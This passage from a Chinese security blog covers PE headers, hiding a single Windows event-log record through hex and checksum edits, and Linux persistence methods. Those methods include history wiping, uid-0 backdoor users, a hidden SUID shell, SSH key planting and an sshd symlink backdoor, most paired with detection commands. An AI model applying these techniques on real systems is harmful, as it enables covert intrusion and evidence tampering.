<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040     // DLL can move.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY    0x0080     // Code Integrity Image</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT    0x0100     // Image is NX compatible</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200     // Image understands isolation and doesn&#x27;t want it</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_SEH       0x0400     // Image does not use SEH.  No SE handler may reside in this image</span><br><span class="line">//seh的保护机制</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_BIND      0x0800     // Do not bind this image.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000     // Image should execute in an AppContainer</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER   0x2000     // Driver uses WDM model</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_GUARD_CF     0x4000     // Image supports Control Flow Guard.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE     0x8000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="4-3-PE节表"><a href="#4-3-PE节表" class="headerlink" title="4.3 PE节表"></a>4.3 PE节表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    //节名</span><br><span class="line">    union &#123; //二选一 通常选后者，音乐不知道具体物理地址</span><br><span class="line">            DWORD   PhysicalAddress;          //本节物理地址</span><br><span class="line">            DWORD   VirtualSize;              //本节实际大小  </span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   //在内存中的偏移地址  加上ImageBase才是内存的真正地址</span><br><span class="line">    DWORD   SizeOfRawData;                    //本节在磁盘中的大小</span><br><span class="line">    DWORD   PointerToRawData;                 //本节在磁盘中的偏移量</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                  //节的属性</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>…. </p>
<br>

<br>

<br>

<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="1-判断样本为dll还是exe"><a href="#1-判断样本为dll还是exe" class="headerlink" title="1.判断样本为dll还是exe"></a>1.判断样本为dll还是exe</h5><p>样本3的文件特征位 0x2102 根据文件特征表  0x2000（dll）+0x0100(32位)+0x0002（可执行文件） </p>
<p>说明该文件为一个可执行的32位dll文件</p>
<p><img src="/posts/d8527941/5.png"></p>
<p>样本4的文件特征为0x0103 即(0x0100+ 0x0002+0x0001) 说明是一个32位可执行的exe</p>
<p><img src="/posts/d8527941/6.png"></p>
<p>因此可以判断样本3为dll文件，样本4为exe文件（如果为XX 01就是一个exe文件，如果是XX 2X说明是dll文件）</p>
<h5 id="2-计算样本的编译时间"><a href="#2-计算样本的编译时间" class="headerlink" title="2.计算样本的编译时间"></a>2.计算样本的编译时间</h5><p>时间戳在NT头后</p>
<p><img src="/posts/d8527941/7.png"></p>
<br>

<p><img src="/posts/d8527941/9.png"></p>
<p>可根据此找到样本3的时间戳为 <code>0x169FCED5</code>   后面 0x00E0 -&gt; 224 说明是32位 </p>
<p>计算方法如下</p>
<p><img src="/posts/d8527941/10.png"></p>
<br>

<p><img src="/posts/d8527941/11.png"></p>
<br>

<h5 id="3-在OD中去对照查看地址"><a href="#3-在OD中去对照查看地址" class="headerlink" title="3.在OD中去对照查看地址"></a>3.在OD中去对照查看地址</h5><p><img src="/posts/d8527941/12.png"></p>
<p>样本3中 </p>
<p><code>AddressOfEntryPoint</code>  程序虚拟入口地址为   <code>0x0002AE57h</code></p>
<p><code>BaseOfCode</code>  代码基址为 <code>0x00001000h</code></p>
<p><code>BaseOfData</code>  数据基址为 <code>0x0003F000h</code></p>
<p><code>ImageBase</code>  为 <code>0x10000000h</code></p>
<p>使用OD打开后 第一行为 <code>AE57</code>  即 程序的虚拟入口地址</p>
<p><img src="/posts/d8527941/13.png"></p>
<p>第一行的地址为 1000h  即BaseOfCode （代码基址地址）</p>
<p>前面为1000 0000h 即 ImageBase（dll默认为 0x10000000h）</p>
]]></content>
  </entry>
  <entry>
    <title>痕迹清理-Windows篇-02</title>
    <url>/posts/41ffc4f2/</url>
    <content><![CDATA[<p>单条日志清理</p>
<p> 参考三好大佬的文章 </p>
<p><a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B">https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B</a></p>
<h3 id="evtx基础知识"><a href="#evtx基础知识" class="headerlink" title="evtx基础知识"></a>evtx基础知识</h3><p>参考<code> https://github.com/libyal/libevtx/blob/main/documentation/Windows XML Event Log (EVTX).asciidoc</code> </p>
<p>evtx文件结构包含3部分</p>
<ul>
<li>file header</li>
<li>chunks</li>
<li>trailing empty values</li>
</ul>
<h4 id="file-header"><a href="#file-header" class="headerlink" title="file header"></a>file header</h4><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header</a></p>
<h3 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h3><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk</a></p>
<h4 id="trailing-empty-values"><a href="#trailing-empty-values" class="headerlink" title="trailing empty values"></a>trailing empty values</h4><p><a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record</a></p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="查看日志文件"><a href="#查看日志文件" class="headerlink" title="查看日志文件"></a>查看日志文件</h4><ul>
<li>使用事件查看器查看</li>
</ul>
<p><img src="/posts/41ffc4f2/1.png"></p>
<p>这里要删除的记录为1915</p>
<p>删除后效果如下</p>
<p><img src="/posts/41ffc4f2/2.png"></p>
<ul>
<li>使用python脚本查看</li>
</ul>
<p>可以使用该工具 <a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a></p>
<p><code>python evtx_record_structure.py System.evtx 1915</code></p>
<p><img src="/posts/41ffc4f2/3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST\Desktop&gt;python evtx_record_structure.py System.evtx 1915</span><br><span class="line">00000000: 2A 2A 00 00 38 01 00 00  7B 07 00 00 00 00 00 00  **..8...&#123;.......</span><br><span class="line">00000010: 23 EB 07 A2 D4 FB D3 01  0F 01 01 00 0C 01 65 CE  #.............e.</span><br><span class="line">00000020: 1B C7 EE 0D 00 00 14 00  00 00 01 00 04 00 01 00  ................</span><br><span class="line">00000030: 04 00 02 00 06 00 02 00  06 00 02 00 06 00 08 00  ................</span><br><span class="line">00000040: 15 00 08 00 11 00 00 00  00 00 04 00 08 00 04 00  ................</span><br><span class="line">00000050: 08 00 08 00 0A 00 01 00  04 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070: 00 00 00 00 00 00 8B 00  21 00 04 00 00 00 7C 1B  ........!.....|.</span><br><span class="line">00000080: 00 40 00 00 00 00 00 00  80 80 23 EB 07 A2 D4 FB  .@........#.....</span><br><span class="line">00000090: D3 01 D8 01 00 00 9C 07  00 00 7B 07 00 00 00 00  ..........&#123;.....</span><br><span class="line">000000A0: 00 00 00 0F 01 01 00 0C  01 DE E1 DC 34 6C 11 00  ............4l..</span><br><span class="line">000000B0: 00 04 00 00 00 4E 00 01  00 08 00 01 00 04 00 08  .....N..........</span><br><span class="line">000000C0: 00 0E 00 0E 00 42 00 61  00 63 00 6B 00 67 00 72  .....B.a.c.k.g.r</span><br><span class="line">000000D0: 00 6F 00 75 00 6E 00 64  00 20 00 49 00 6E 00 74  .o.u.n.d. .I.n.t</span><br><span class="line">000000E0: 00 65 00 6C 00 6C 00 69  00 67 00 65 00 6E 00 74  .e.l.l.i.g.e.n.t</span><br><span class="line">000000F0: 00 20 00 54 00 72 00 61  00 6E 00 73 00 66 00 65  . .T.r.a.n.s.f.e</span><br><span class="line">00000100: 00 72 00 20 00 53 00 65  00 72 00 76 00 69 00 63  .r. .S.e.r.v.i.c</span><br><span class="line">00000110: 00 65 00 63 6B 28 57 D0  8F 4C 88 0E 00 00 00 42  .e.ck(W..L.....B</span><br><span class="line">00000120: 00 49 00 54 00 53 00 2F  00 34 00 00 00 00 00 00  .I.T.S./.4......</span><br><span class="line">00000130: 15 00 00 00 38 01 00 00                           ....8...</span><br><span class="line">record(absolute_offset=8776)</span><br><span class="line">RootNode(offset=0x18)</span><br><span class="line">  StreamStartNode(offset=0x18)</span><br><span class="line">  TemplateInstanceNode(offset=0x1c, resident=False)</span><br><span class="line">  Substitutions(offset=0x26)</span><br><span class="line">    UnsignedByteTypeNode(offset=0x7a) --&gt; 4</span><br><span class="line">    UnsignedByteTypeNode(offset=0x7b) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset=0x7c) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset=0x7e) --&gt; 7036</span><br><span class="line">    UnsignedWordTypeNode(offset=0x80) --&gt; 16384</span><br><span class="line">    Hex64TypeNode(offset=0x82) --&gt; 0x8080000000000000</span><br><span class="line">    FiletimeTypeNode(offset=0x8a) --&gt; 2018-06-04 07:21:19.394281</span><br><span class="line">    NullTypeNode(offset=0x92)</span><br><span class="line">    UnsignedDwordTypeNode(offset=0x92) --&gt; 472</span><br><span class="line">    UnsignedDwordTypeNode(offset=0x96) --&gt; 1948</span><br><span class="line">    UnsignedQwordTypeNode(offset=0x9a) --&gt; 1915</span><br><span class="line">    UnsignedByteTypeNode(offset=0xa2) --&gt; 0</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    BXmlTypeNode(offset=0xa3) --&gt;</span><br><span class="line">      RootNode(offset=0xa3)</span><br><span class="line">        StreamStartNode(offset=0xa3)</span><br><span class="line">        TemplateInstanceNode(offset=0xa7, resident=False)</span><br><span class="line">        Substitutions(offset=0xb1)</span><br><span class="line">          WstringTypeNode(offset=0xc5) --&gt; Background Intelligent Transfer Servi</span><br><span class="line">ce</span><br><span class="line">          WstringTypeNode(offset=0x113) --&gt; 正在运行</span><br><span class="line">          UnsignedDwordTypeNode(offset=0x11b) --&gt; 14</span><br><span class="line">          BinaryTypeNode(offset=0x11f) --&gt; QgBJAFQAUwAvADQAAAA=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;&lt;System&gt;&lt;Pr</span><br><span class="line">ovider Name=&quot;Service Control Manager&quot; Guid=&quot;&#123;555908d1-a6d7-4695-8e1e-26931d2012f</span><br><span class="line">4&#125;&quot; EventSourceName=&quot;Service Control Manager&quot;&gt;&lt;/Provider&gt;</span><br><span class="line">&lt;EventID Qualifiers=&quot;16384&quot;&gt;7036&lt;/EventID&gt;</span><br><span class="line">&lt;Version&gt;0&lt;/Version&gt;</span><br><span class="line">&lt;Level&gt;4&lt;/Level&gt;</span><br><span class="line">&lt;Task&gt;0&lt;/Task&gt;</span><br><span class="line">&lt;Opcode&gt;0&lt;/Opcode&gt;</span><br><span class="line">&lt;Keywords&gt;0x8080000000000000&lt;/Keywords&gt;</span><br><span class="line">&lt;TimeCreated SystemTime=&quot;2018-06-04 07:21:19.394281&quot;&gt;&lt;/TimeCreated&gt;</span><br><span class="line">&lt;EventRecordID&gt;1915&lt;/EventRecordID&gt;</span><br><span class="line">&lt;Correlation ActivityID=&quot;&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;</span><br><span class="line">&lt;Execution ProcessID=&quot;472&quot; ThreadID=&quot;1948&quot;&gt;&lt;/Execution&gt;</span><br><span class="line">&lt;Channel&gt;System&lt;/Channel&gt;</span><br><span class="line">&lt;Computer&gt;WIN-E8C6J8CN50O&lt;/Computer&gt;</span><br><span class="line">&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;</span><br><span class="line">&lt;/System&gt;</span><br><span class="line">&lt;EventData&gt;&lt;Data Name=&quot;param1&quot;&gt;Background Intelligent Transfer Service&lt;/Data&gt;</span><br><span class="line">&lt;Data Name=&quot;param2&quot;&gt;&amp;#27491;&amp;#22312;&amp;#36816;&amp;#34892;&lt;/Data&gt;</span><br><span class="line">&lt;Binary&gt;QgBJAFQAUwAvADQAAAA=&lt;/Binary&gt;</span><br><span class="line">&lt;/EventData&gt;</span><br><span class="line">&lt;/Event&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="删除单条日志思路——覆盖"><a href="#删除单条日志思路——覆盖" class="headerlink" title="删除单条日志思路——覆盖"></a>删除单条日志思路——覆盖</h4><p>修改日志 Event Record size长度，然后覆盖掉下一条日志，这样windows在解析日志时，下一条日志就会被隐藏，从而实现所谓的单条目录的删除</p>
<p><img src="/posts/41ffc4f2/4.png" alt="从大佬那里抄的图"></p>
<p>具体方法:</p>
<ul>
<li><p>1.file header中的Next record identifier减一</p>
</li>
<li><p>2.重新计算file header 中的 chunksum</p>
</li>
<li><p>3.修改Event Record:</p>
<p>重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier</p>
</li>
<li><p>4.更新ElfChnk，</p>
</li>
</ul>
<h4 id="删除单条日志的实例"><a href="#删除单条日志的实例" class="headerlink" title="删除单条日志的实例"></a>删除单条日志的实例</h4><p>实例样本 <a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx</a></p>
<h5 id="File-header-Next-record-identifier值-1"><a href="#File-header-Next-record-identifier值-1" class="headerlink" title="File header   Next record identifier值 -1"></a>File header   Next record identifier值 -1</h5><p>这里采用小端序 0x077c  减一后为 0x77b</p>
<p><img src="/posts/41ffc4f2/5.png" alt="修改后"></p>
<h5 id="重新计算checksum值"><a href="#重新计算checksum值" class="headerlink" title="重新计算checksum值"></a>重新计算checksum值</h5><p><img src="/posts/41ffc4f2/6.png" alt="原值"></p>
<p>计算前120bytes 的 CRC32，直接引用大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc2hex</span>(<span class="params">crc</span>):   </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%08x&#x27;</span> % (binascii.crc32(binascii.a2b_hex(crc)) &amp; <span class="number">0xffffffff</span>)     </span><br><span class="line"></span><br><span class="line">d=<span class="string">&#x27;456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(crc2hex(d)</span><br></pre></td></tr></table></figure>

<p>得到结果为 <code>ccc94756</code> 然后进行替换 </p>
<p><img src="/posts/41ffc4f2/7.png"></p>
<h5 id="修改Event-Record"><a href="#修改Event-Record" class="headerlink" title="修改Event Record"></a>修改Event Record</h5><h5 id="重新计算待删除Event-Record前后长度，更新后续Event-Record的Event-record-identifier"><a href="#重新计算待删除Event-Record前后长度，更新后续Event-Record的Event-record-identifier" class="headerlink" title="重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier"></a>重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier</h5><p><img src="/posts/41ffc4f2/8.png"></p>
<p>Event record头为 0x2a\0x2a\0x00\0x00 在010editor搜索一下 找到Event record头</p>
<p>途中的 0x0778 对应值为 1912 这个是日志中的第一条日志，这里要删除1915 那么去找到  0x077b值对应的EventRecord（第四条日志）</p>
<p><img src="/posts/41ffc4f2/10.png" alt="第四条日志"></p>
<p>长度为 0x0138h  EventRecord ID 为 0x77bh(1915)</p>
<p>结尾处的值为EventRecord 长度 0x138h 在后面需要覆盖后也要修改这个值</p>
<p>再找到第三条日志</p>
<p><img src="/posts/41ffc4f2/11.png"></p>
<p>长度为 0x0480h EventRecord ID为 0x77ah (1914)</p>
<p>找到两条日志后 修改一下 第三条日志的长度 使其覆盖掉第四条日志</p>
<p>New_legth = 0x138h+0x480h=0x5b8h</p>
<p><img src="/posts/41ffc4f2/12.png"></p>
<p>然后更新第四条日志最后面的长度 从0x138h 改为 0x5b8h</p>
<p><img src="/posts/41ffc4f2/13.png"></p>
<h5 id="更新ElfChnk"><a href="#更新ElfChnk" class="headerlink" title="更新ElfChnk"></a>更新ElfChnk</h5><p><img src="/posts/41ffc4f2/15.png"></p>
<p><img src="/posts/41ffc4f2/16.png"></p>
<p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header</a></p>
<p>在测试日志中只有一个Elfchnk 但别的可能会有多个ElfChnk 需要找到对应的 ElfChnk </p>
<p><img src="/posts/41ffc4f2/14.png"></p>
<p>修改<code>last Event record number</code>  0x04h -1 =  0x03h </p>
<p>修改<code>last Event record identifier</code> 0x77bh -1 = 0x77ah </p>
<p>修改<code>Last event record data offset</code>  0x1248h =&gt;  0xDC8h</p>
<p>为第三条Event Record(最后一条)相对于ElfChuk的偏移长度   </p>
<p>ElfChnk 为 0x1000h 第三条开始位置为 0x1DC8h  所以偏移量为 0xDC8h</p>
<p>修改<code>Event records checksum</code> 0xD3D3DE43h =&gt;  0xF92FEDB9h</p>
<p><code>Event records checksum</code> 为所有Event records 的校验和 这里需要计算三条的 </p>
<p>计算过程 抽时间算一下 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`</p>
<p>计算后为 <code>0xF92FEDB9h</code></p>
<p>修改<code> Checksum</code>  0xEB4C47BFh =&gt; 0x3CE0BF8h</p>
<p>计算前120 和128-512 处的CRC32值  结果为 <code>0x3CE0BF8h</code></p>
<p><img src="/posts/41ffc4f2/17.png"></p>
<p>另存后打开 可以看到 第四条我们想要删除的日志已经成功隐藏</p>
<p><img src="/posts/41ffc4f2/18.png"></p>
]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持-Linux篇</title>
    <url>/posts/29801cba/</url>
    <content><![CDATA[<h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3><h4 id="0x00-隐藏技巧"><a href="#0x00-隐藏技巧" class="headerlink" title="0x00 隐藏技巧"></a>0x00 隐藏技巧</h4><h5 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h5><p>修改文件的生成时间</p>
<p><code>touch -r index.php shell.php</code></p>
<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件</p>
<h5 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h5><p>Linux中使用<code>chattr</code>命令来防止root和其他管理用户误删除和修改重要文件以及目录，此权限是用<code>ls -l</code>查看不出来的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +i test.php #锁定文件</span><br><span class="line">rm -rf test.php #提示禁止删除文件</span><br><span class="line"></span><br><span class="line">lsattr test.php #属性查看</span><br><span class="line">chattr -i test.php #解除锁定</span><br><span class="line">rm -rf test.php #彻底删除文件</span><br></pre></td></tr></table></figure>

<h5 id="历史操作命令"><a href="#历史操作命令" class="headerlink" title="历史操作命令"></a>历史操作命令</h5><p><code>[space]set +o history #备注：[space]表示空格。并且由于空格的原因，该命令本身也不会被记录。</code></p>
<p>上面的命令会临时禁用历史功能，即执行后的命令不会记录在历史中</p>
<p><code>[space]set -o history #将环境恢复原状</code></p>
<p>删除历史记录中的指定命令</p>
<p><code>history | grep &quot;keyword&quot;</code></p>
<p>输出了历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
<p><code>history -d [num] </code></p>
<p>大规模删除历史操作记录</p>
<p><code>set -i &#39;150,$d&#39; .bash_history   #只保留前150行</code></p>
<h4 id="0x01-添加用户"><a href="#0x01-添加用户" class="headerlink" title="0x01 添加用户"></a>0x01 添加用户</h4><h5 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"># useradd -p 方法 ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<h5 id="添加root用户"><a href="#添加root用户" class="headerlink" title="添加root用户"></a>添加root用户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root</span><br><span class="line">-s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>

<h5 id="passwd写入"><a href="#passwd写入" class="headerlink" title="passwd写入"></a>passwd写入</h5><p>(注:现在较新的系统无法成功利用 在su切换用户时会提示用户不存在)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd 各部分含义：</span><br><span class="line">⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL</span><br><span class="line">/etc/shadow 各部分含义：</span><br><span class="line">⽤户名：密码的MD5加密值：⾃系统使⽤以来⼝令被修改的天数：⼝令的最⼩修改间隔：⼝令更改的周期：⼝令失效的</span><br><span class="line">天数：⼝令失效以后帐号会被锁定多少天：⽤户帐号到期时间：保留字段尚未使⽤</span><br></pre></td></tr></table></figure>

<h6 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$echo &quot;test:savbSWc4rx8NY:hacker:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但<br>是由于<code>/etc/passwd</code>文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统都使<br>用了shadow技术，把真正加密后的用户口令字段存放到<code>/etc/shadow</code>文件中，而在<code>/etc/passwd</code>文件的<br>口令字段中只存放了一个特殊的字符，例如”x”或者”*”</p>
<h6 id="如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号"><a href="#如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号" class="headerlink" title="如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号"></a>如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号</h6><p><code>echo &quot;test:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</code></p>
<br>

<h5 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x02-SUID-shell"><a href="#0x02-SUID-shell" class="headerlink" title="0x02 SUID shell"></a>0x02 SUID shell</h4><p>SUID shell 是一种可用于以拥有者权限运行的shell</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>创建suid权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash  /tmp/.woot</span><br><span class="line">chmod 4755 /tmp/.woot</span><br><span class="line">ls -al /.woot</span><br></pre></td></tr></table></figure>

<p>这样做相当于复制了一些新的bash到tmp目录下，然后可以在使用它时调用root权限</p>
<p>使用普通用户运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/.woot</span><br><span class="line">/tmp/.woot -p   //bash2针对suid有一些保护措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure>

<h5 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找具有suid的权限的应用</span><br><span class="line">find / -perm +4000 -ls</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm /4000</span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm /2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s /tmp/.woot</span><br></pre></td></tr></table></figure>

<h4 id="0x03-ssh公私钥"><a href="#0x03-ssh公私钥" class="headerlink" title="0x03 ssh公私钥"></a>0x03 ssh公私钥</h4><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配，如果匹配成功就可以登录了。</p>
<p>客户端</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>进入 <code>/root/.ssh/</code>文件夹即可查看到生成公私钥，<code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，</p>
<p>将公钥复制放到目标机器上的 <code>.ssh/authorized_keys</code>中     <code>echo id_rsa.pub &gt;&gt; .ssh/authorized_keys </code> </p>
<h5 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h5><p>查看 <code>/root/.ssh/authoritized_keys</code>是否被修改</p>
<br>

<h4 id="0x04-软连接"><a href="#0x04-软连接" class="headerlink" title="0x04 软连接"></a>0x04 软连接</h4><h5 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h5><p>通过软连接建立一个ssh后门：</p>
<p><code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=8888</code></p>
<p>(注:如果目标在执行软连接时使用的其他账户创建的，那么在登陆时也要选择    对应的账户去登录，而非root账户)</p>
<p>执行完后 在任意机器上使用<code>ssh root@xxx.xxx.xxx.xxx -p 8888</code> 即可连接</p>
<h5 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h5><p>通过查看端口或者进程都会发现异常连接 使用 <code>kill -s 9 PID</code> 杀掉进程即可清除后门</p>
<p><img src="/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc" alt="截图"></p>
<br>

<h4 id="0x05-crontab反弹shell"><a href="#0x05-crontab反弹shell" class="headerlink" title="0x05 crontab反弹shell"></a>0x05 crontab反弹shell</h4><h5 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h5><p>cron表达式在线⽣成：<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
<ul>
<li>创建shell脚本脚本 </li>
</ul>
